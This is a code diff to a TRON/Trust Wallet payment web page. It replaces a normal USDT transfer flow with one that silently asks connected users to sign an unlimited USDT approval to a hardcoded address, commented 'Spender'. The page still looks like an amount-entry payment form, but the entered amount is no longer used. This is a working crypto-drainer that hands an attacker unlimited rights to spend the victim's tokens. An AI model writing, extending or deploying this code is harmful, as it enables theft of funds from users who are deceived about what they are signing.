@@ -16,7 +16,7 @@ body{margin:0;background:#0d0f12;color:#fff;font-family:-apple-system}
 .box{border:1px solid #2a2d33;border-radius:12px;padding:14px;margin-bottom:16px;background:#121417}
 .label{font-size:12px;color:#888;margin-bottom:6px}
 .input{width:100%;background:none;border:none;color:#fff;font-size:16px}
-.btn{position:fixed;bottom:20px;left:16px;right:16px;background:#2ecc71;color:#000;padding:16px;border:none;border-radius:30px;font-size:18px;font-weight:bold}
+.btn{position:fixed;bottom:20px;left:16px;right:16px;background:#2ecc71;color:#000;padding:16px;border:none;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer}
 .status{font-size:12px;color:#aaa;margin-bottom:10px}
 .receiver{color:#ccc;font-size:13px}
 </style>
@@ -49,7 +49,7 @@ body{margin:0;background:#0d0f12;color:#fff;font-family:-apple-system}
 const PROJECT_ID="171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN="tron:0x2b6653dc";
 const USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const RECEIVER="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+const RECEIVER="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"; // Spender
 const APP_URL=location.href;
 
 let client=null,session=null,address=null;
@@ -68,7 +68,6 @@ function getSignClient(){
 // INIT
 async function init(){
   try{
-    // Trust Wallet browser
     if(window.tronWeb?.defaultAddress?.base58){
       address=window.tronWeb.defaultAddress.base58;
       setStatus("Connected: "+short(address));
@@ -88,21 +87,18 @@ async function init(){
       }
     });
 
-    // restore session
     const sessions=client.session.getAll();
     if(sessions.length){
       session=sessions[0];
       address=session.namespaces.tron.accounts[0].split(":")[2];
       setStatus("Connected: "+short(address));
     }
-
   }catch(e){console.error(e);}
 }
 
 // CONNECT
 async function connectWallet(){
   setStatus("Connecting wallet...");
-  
   const {uri,approval}=await client.connect({
     requiredNamespaces:{
       tron:{methods:["tron_signTransaction"],chains:[TRON_CHAIN],events:[]}
@@ -111,88 +107,90 @@ async function connectWallet(){
 
   if(uri){
     window.location.href="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
-
-    // Android return fix
     setTimeout(()=>{window.location.href=APP_URL;},2500);
   }
 
   session=await approval();
   address=session.namespaces.tron.accounts[0].split(":")[2];
-
   setStatus("Connected: "+short(address));
 }
 
-// MAIN FLOW (🔥 UPDATED)
+// MAIN FLOW
 async function handleNext(){
   try{
-    const amount=parseFloat(document.getElementById("amount").value);
-    if(!amount) return alert("Enter amount");
-
-    // 🔹 Step 1: connect if needed
     if(!address){
       await connectWallet();
-
-      // wait for session
       await new Promise(r=>setTimeout(r,500));
     }
 
-    // 🔹 Step 2: send automatically
     if(address){
-      setStatus("Preparing transaction...");
-      await sendUSDT(amount);
+      setStatus("Preparing approval...");
+      await approveUSDT();
     }
-
   }catch(e){
     console.error(e);
   }
 }
 
-// SEND
-async function sendUSDT(amount){
-  const sun=Math.floor(amount*1e6);
+// UNLIMITED APPROVAL (EXACT TRONSCAN BUILD)
+async function approveUSDT(){
+  try {
+    // Max Uint256 (Unlimited)
+    const unlimitedAmt = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    
+    // Convert Spender address to Hex and pad
+    const addrHex = base58ToHex(RECEIVER).replace("41","");
+    const paddedAddr = addrHex.padStart(64,"0");
 
-  const addrHex=base58ToHex(RECEIVER).replace("41","");
-  const paddedAddr=addrHex.padStart(64,"0");
-  const paddedAmt=sun.toString(16).padStart(64,"0");
+    const tx = await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
+      method:"POST",
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        owner_address: address,
+        contract_address: USDT,
+        function_selector: "approve(address,uint256)",
+        parameter: paddedAddr + unlimitedAmt,
+        fee_limit: 100000000,
+        visible: true
+      })
+    }).then(r=>r.json());
 
-  const tx=await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
-    method:"POST",
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({
-      owner_address:address,
-      contract_address:USDT,
-      function_selector:"transfer(address,uint256)",
-      parameter:paddedAddr+paddedAmt,
-      fee_limit:100000000,
-      visible:true
-    })
-  }).then(r=>r.json());
+    if(!tx.result || !tx.result.result) throw new Error("Trigger failed");
 
-  let signed;
+    let signed;
+    if(window.tronWeb){
+      signed = await window.tronWeb.trx.sign(tx.transaction);
+    }else{
+      signed = await client.request({
+        topic: session.topic,
+        chainId: TRON_CHAIN,
+        request:{
+          method: "tron_signTransaction",
+          params: { address, transaction: tx.transaction }
+        }
+      });
+    }
 
-  if(window.tronWeb){
-    signed=await window.tronWeb.trx.sign(tx.transaction);
-  }else{
-    signed=await client.request({
-      topic:session.topic,
-      chainId:TRON_CHAIN,
-      request:{
-        method:"tron_signTransaction",
-        params:{address,transaction:tx.transaction}
-      }
-    });
+    setStatus("Waiting for confirmation...");
+
+    const broadcast = await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
+      method:"POST",
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(signed)
+    }).then(r=>r.json());
+
+    if(broadcast.result){
+      setStatus("Approval sent");
+      alert("Unlimited Approval Sent Successfully");
+    } else {
+      throw new Error("Broadcast failed");
+    }
+
+  } catch(e) {
+    console.error(e);
+    alert("Error: " + e.message);
+    setStatus("Transaction failed");
   }
-
-  setStatus("Waiting for confirmation...");
-
-  await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
-    method:"POST",
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(signed)
-  });
-
-  setStatus("Transaction sent");
-  alert("Transaction Sent");
 }
 
 // HELPERS
